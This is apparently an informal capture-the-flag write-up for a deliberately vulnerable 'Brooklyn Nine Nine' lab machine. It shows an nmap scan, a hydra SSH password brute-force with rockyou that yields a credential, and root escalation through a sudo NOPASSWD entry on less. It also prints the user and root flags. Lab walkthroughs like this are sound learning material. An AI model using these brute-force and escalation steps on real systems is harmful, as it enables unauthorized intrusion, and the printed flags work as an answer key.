```bash  
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.7.39             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 12:10 EDT
Nmap scan report for 10.10.7.39
Host is up (0.100s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
```                 
                    
ftp 

```bash                                                           
┌──(kali㉿kali)-[~]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
jake:?

port 80 code has hint, steghide time

need passcode,,, decided to hydra and that was quick, maybe passcode is in ssh, 


```bash
┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
└─$ cd /hackme
                                                                                   
┌──(kali㉿kali)-[/hackme]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.7.39 ssh   
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-22 12:24:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.7.39:22/
[22][ssh] host: 10.10.7.39   login: jake   password: 987654321
^C                                        
```

jake:987654321


three users
```bash
jake@brookly_nine_nine:/home$ ls
amy  holt  jake


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
amy:x:1001:1001:,,,:/home/amy:/bin/bash
holt:x:1002:1002:,,,:/home/holt:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
jake:x:1000:1000:,,,:/home/jake:/bin/bash
```

looks like we are at the bottom
```bash
jake@brookly_nine_nine:/$ la -lah /etc/passwd
-rw-r--r-- 1 root root 1.7K May 18  2020 /etc/passwd
jake@brookly_nine_nine:/$ la -lah /etc/shadow
-rw-r----- 1 root shadow 1.2K May 19  2020 /etc/shadow


jake@brookly_nine_nine:/$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/$ sudo less /etc/profile
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

```

sudo less gave me root and got root flag, user flag? 

```bash
# cd /home/jake
# dir
# ls
# pwd
/home/jake
# cd /home/amy
# ls
# pwd
/home/amy
# cd /home/holt
# pwd
/home/holt
# ls
nano.save  user.txt
# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

so steghide was a rabbit hole,,,,                                     